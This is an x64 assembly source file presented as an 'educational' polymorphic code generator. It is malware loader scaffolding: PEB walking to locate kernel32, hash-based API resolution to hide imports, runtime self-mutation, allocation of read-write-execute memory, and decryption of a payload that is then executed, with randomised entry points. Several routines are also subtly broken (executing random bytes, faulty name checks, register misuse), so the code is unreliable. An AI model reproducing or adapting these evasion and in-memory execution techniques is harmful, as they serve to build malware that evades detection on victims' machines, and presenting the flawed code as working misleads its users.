; polymorph_dynamic.asm - Fully Dynamic Polymorphic Code Generator
; Educational/Research Purpose Only - 2025
; ml64 /c polymorph_dynamic.asm
; link /subsystem:console /entry:DynamicMain polymorph_dynamic.obj

OPTION DOTNAME
OPTION PROLOGUE:NONE
OPTION EPILOGUE:NONE

; ==================  DYNAMIC CONFIG  ==================
; These values change at runtime
INITIAL_SEED    EQU 0A7F9C2E5h
MAX_PAYLOAD     EQU 1024
MIN_PAYLOAD     EQU 256

EXTERN  ExitProcess      : PROC
EXTERN  VirtualAlloc     : PROC
EXTERN  VirtualProtect   : PROC
EXTERN  GetTickCount64   : PROC
EXTERN  QueryPerformanceCounter : PROC

.data
; Dynamic state variables
CurrentSeed     DQ      INITIAL_SEED
PayloadSize     DQ      512
RotationCount   DB      13
MutationLevel   DB      0
EntrySelector   DB      0

; PRNG state for Xoroshiro128++
PRNGState0      DQ      0
PRNGState1      DQ      0

.code

; ==================  ADVANCED PRNG  ==================
; Initialize PRNG with multiple entropy sources
InitDynamicPRNG PROC
    sub     rsp, 28h
    
    ; Get tick count for initial entropy
    call    GetTickCount64
    mov     [PRNGState0], rax
    
    ; Get performance counter for more entropy
    lea     rcx, [PRNGState1]
    call    QueryPerformanceCounter
    
    ; Mix with initial seed
    mov     rax, INITIAL_SEED
    xor     [PRNGState0], rax
    ror     rax, 17
    xor     [PRNGState1], rax
    
    ; Mix with stack pointer for ASLR entropy
    mov     rax, rsp
    xor     [PRNGState0], rax
    
    add     rsp, 28h
    ret
InitDynamicPRNG ENDP

; Xoroshiro128++ algorithm for better randomness
Rand64 PROC
    mov     rax, [PRNGState0]
    mov     rdx, [PRNGState1]
    
    ; Result = rotl(s0 + s1, 17) + s0
    mov     rcx, rax
    add     rcx, rdx
    rol     rcx, 17
    add     rcx, rax
    mov     r8, rcx          ; Save result
    
    ; s1 ^= s0
    xor     rdx, rax
    
    ; s0 = rotl(s0, 49) ^ s1 ^ (s1 << 21)
    rol     rax, 49
    xor     rax, rdx
    mov     rcx, rdx
    shl     rcx, 21
    xor     rax, rcx
    mov     [PRNGState0], rax
    
    ; s1 = rotl(s1, 28)
    rol     rdx, 28
    mov     [PRNGState1], rdx
    
    mov     rax, r8          ; Return result
    ret
Rand64 ENDP

; Get random 32-bit value
Rand32 PROC
    call    Rand64
    ; Return lower 32 bits
    ret
Rand32 ENDP

; ==================  DYNAMIC MUTATION ENGINE  ==================
MutateCode PROC
    push    rbx
    push    rsi
    push    rdi
    
    ; Get random mutation level
    call    Rand32
    and     al, 7
    mov     [MutationLevel], al
    
    ; Mutate rotation count
    call    Rand32
    and     al, 31
    inc     al
    mov     [RotationCount], al
    
    ; Mutate payload size
    call    Rand32
    and     eax, 3FFh        ; 0-1023
    add     eax, MIN_PAYLOAD
    mov     [PayloadSize], rax
    
    ; Mutate entry selector
    call    Rand32
    and     al, 7            ; 0-7 for 8 possible entries
    mov     [EntrySelector], al
    
    pop     rdi
    pop     rsi
    pop     rbx
    ret
MutateCode ENDP

; ==================  DYNAMIC HASH FUNCTION  ==================
DynamicHash PROC
    ; Input: RSI = string pointer
    ; Output: RAX = hash
    xor     rax, rax
    xor     rdx, rdx
    movzx   rcx, [RotationCount]    ; Use dynamic rotation
    
HashLoop:
    lodsb
    test    al, al
    jz      HashDone
    
    ; Dynamic rotation based on current RotationCount
    ror     rdx, cl
    
    ; Additional mixing based on MutationLevel
    movzx   rbx, [MutationLevel]
    test    bl, 1
    jz      SkipXor
    xor     rdx, rax
    
SkipXor:
    add     rdx, rax
    
    test    bl, 2
    jz      SkipMul
    imul    rdx, rdx, 31
    
SkipMul:
    jmp     HashLoop
    
HashDone:
    mov     rax, rdx
    ret
DynamicHash ENDP

; ==================  KERNEL32 RESOLUTION  ==================
GetKernel32Dynamic PROC
    mov     rax, gs:[60h]           ; PEB
    mov     rax, [rax+18h]          ; PEB_LDR_DATA
    mov     rsi, [rax+20h]          ; InMemoryOrderModuleList
    
FindKernel:
    mov     rax, [rsi]              ; Get next entry
    mov     rcx, [rax+50h]          ; BaseDllName.Buffer
    
    ; Dynamic check for kernel32
    mov     rdx, 6C6C642Eh          ; ".dll" in little endian
    mov     rbx, 32336C656Eh        ; "nel32" in little endian
    mov     r8, 7265h               ; "er" in little endian
    
    ; Check for "kernel32.dll"
    cmp     qword ptr [rcx+6], rdx
    jne     NextModule
    cmp     qword ptr [rcx], rbx
    jne     NextModule
    
    mov     rax, [rax+20h]          ; DllBase
    ret
    
NextModule:
    mov     rsi, rax
    jmp     FindKernel
GetKernel32Dynamic ENDP

; ==================  DYNAMIC API RESOLUTION  ==================
GetAPIDynamic PROC
    ; RCX = module base, RDX = hash
    push    rbx
    push    rsi
    push    rdi
    
    mov     rbx, rcx
    mov     eax, [rbx+3Ch]          ; e_lfanew
    add     rax, rbx
    mov     eax, [rax+88h]          ; Export Directory RVA
    add     rax, rbx
    
    mov     esi, [rax+20h]          ; AddressOfNames
    add     rsi, rbx
    mov     ecx, [rax+18h]          ; NumberOfNames
    
SearchLoop:
    dec     ecx
    js      NotFound
    
    mov     edi, [rsi+rcx*4]
    add     rdi, rbx
    
    push    rcx
    push    rdx
    push    rsi
    
    mov     rsi, rdi
    call    DynamicHash
    
    pop     rsi
    pop     rdx
    pop     rcx
    
    cmp     rax, rdx
    jne     SearchLoop
    
    ; Found - get function address
    mov     edx, [rax+24h]          ; AddressOfNameOrdinals
    add     rdx, rbx
    movzx   ecx, word ptr [rdx+rcx*2]
    
    mov     edx, [rax+1Ch]          ; AddressOfFunctions
    add     rdx, rbx
    mov     eax, [rdx+rcx*4]
    add     rax, rbx
    
    pop     rdi
    pop     rsi
    pop     rbx
    ret
    
NotFound:
    xor     rax, rax
    pop     rdi
    pop     rsi
    pop     rbx
    ret
GetAPIDynamic ENDP

; ==================  DYNAMIC PAYLOAD GENERATOR  ==================
GenerateDynamicPayload PROC
    push    rsi
    push    rdi
    push    rcx
    
    lea     rdi, [DynamicPayload]
    mov     rcx, [PayloadSize]
    
GenLoop:
    call    Rand32
    stosb
    loop    GenLoop
    
    pop     rcx
    pop     rdi
    pop     rsi
    ret
GenerateDynamicPayload ENDP

; ==================  DYNAMIC DECRYPTION  ==================
DecryptDynamicPayload PROC
    push    rsi
    push    rdi
    push    rcx
    push    rbx
    
    mov     rsi, rcx            ; Source
    mov     rdi, rdx            ; Destination
    mov     rcx, [PayloadSize]
    
    ; Initialize decryption key from current seed
    call    Rand64
    mov     rbx, rax
    
DecryptLoop:
    lodsb
    
    ; Multi-layer decryption based on MutationLevel
    movzx   rdx, [MutationLevel]
    test    dl, 1
    jz      SkipXorDec
    xor     al, bl
    
SkipXorDec:
    test    dl, 2
    jz      SkipRotDec
    ror     al, 3
    
SkipRotDec:
    test    dl, 4
    jz      SkipAddDec
    sub     al, bl
    
SkipAddDec:
    stosb
    
    ; Update key
    ror     rbx, 8
    call    Rand32
    xor     bl, al
    
    loop    DecryptLoop
    
    pop     rbx
    pop     rcx
    pop     rdi
    pop     rsi
    ret
DecryptDynamicPayload ENDP

; ==================  HOT PATCHER  ==================
HotPatch PROC
    push    rax
    push    rcx
    push    rdx
    
    ; Patch random locations
    call    Rand32
    and     eax, 7
    
    cmp     al, 0
    je      PatchSeed
    cmp     al, 1
    je      PatchRotation
    cmp     al, 2
    je      PatchPayloadSize
    jmp     PatchDone
    
PatchSeed:
    call    Rand64
    mov     [CurrentSeed], rax
    jmp     PatchDone
    
PatchRotation:
    call    Rand32
    and     al, 31
    inc     al
    mov     [RotationCount], al
    jmp     PatchDone
    
PatchPayloadSize:
    call    Rand32
    and     eax, 3FFh
    add     eax, MIN_PAYLOAD
    mov     [PayloadSize], rax
    
PatchDone:
    pop     rdx
    pop     rcx
    pop     rax
    ret
HotPatch ENDP

; ==================  MAIN EXECUTION ENGINE  ==================
ExecutePayload PROC
    sub     rsp, 28h
    
    ; Allocate RWX memory
    xor     rcx, rcx
    mov     rdx, [PayloadSize]
    mov     r8, 3000h           ; MEM_COMMIT | MEM_RESERVE
    mov     r9, 40h             ; PAGE_EXECUTE_READWRITE
    call    VirtualAlloc
    
    test    rax, rax
    jz      ExecError
    
    mov     r12, rax            ; Save allocated address
    
    ; Generate and decrypt payload
    call    GenerateDynamicPayload
    
    lea     rcx, [DynamicPayload]
    mov     rdx, r12
    call    DecryptDynamicPayload
    
    ; Execute payload
    call    r12
    
    ; Clean up would go here
    
ExecError:
    add     rsp, 28h
    ret
ExecutePayload ENDP

; ==================  DYNAMIC ENTRY POINTS  ==================
Entry0:
    call    MutateCode
    call    ExecutePayload
    jmp     DynamicExit

Entry1:
    call    HotPatch
    call    MutateCode
    call    ExecutePayload
    jmp     DynamicExit

Entry2:
    call    InitDynamicPRNG
    call    MutateCode
    call    HotPatch
    call    ExecutePayload
    jmp     DynamicExit

Entry3:
    call    MutateCode
    call    HotPatch
    call    ExecutePayload
    jmp     DynamicExit

Entry4:
    call    InitDynamicPRNG
    call    ExecutePayload
    jmp     DynamicExit

Entry5:
    call    HotPatch
    call    InitDynamicPRNG
    call    ExecutePayload
    jmp     DynamicExit

Entry6:
    call    ExecutePayload
    call    MutateCode
    jmp     DynamicExit

Entry7:
    call    InitDynamicPRNG
    call    HotPatch
    call    MutateCode
    call    ExecutePayload
    jmp     DynamicExit

; ==================  DYNAMIC MAIN  ==================
DynamicMain PROC
    sub     rsp, 28h
    
    ; Initialize PRNG
    call    InitDynamicPRNG
    
    ; Apply initial mutations
    call    MutateCode
    
    ; Select entry based on EntrySelector
    movzx   rax, [EntrySelector]
    
    ; Jump table for dynamic entry
    lea     rcx, [JumpTable]
    jmp     qword ptr [rcx + rax*8]
    
JumpTable:
    DQ      Entry0
    DQ      Entry1
    DQ      Entry2
    DQ      Entry3
    DQ      Entry4
    DQ      Entry5
    DQ      Entry6
    DQ      Entry7
    
DynamicMain ENDP

; ==================  DYNAMIC EXIT  ==================
DynamicExit PROC
    ; Final mutations before exit
    call    HotPatch
    
    ; Random exit code
    call    Rand32
    and     ecx, 0FFh
    
    ; Exit
    call    ExitProcess
DynamicExit ENDP

; ==================  DYNAMIC DATA SECTION  ==================
.data
DynamicPayload  DB  MAX_PAYLOAD DUP(?)

END DynamicMain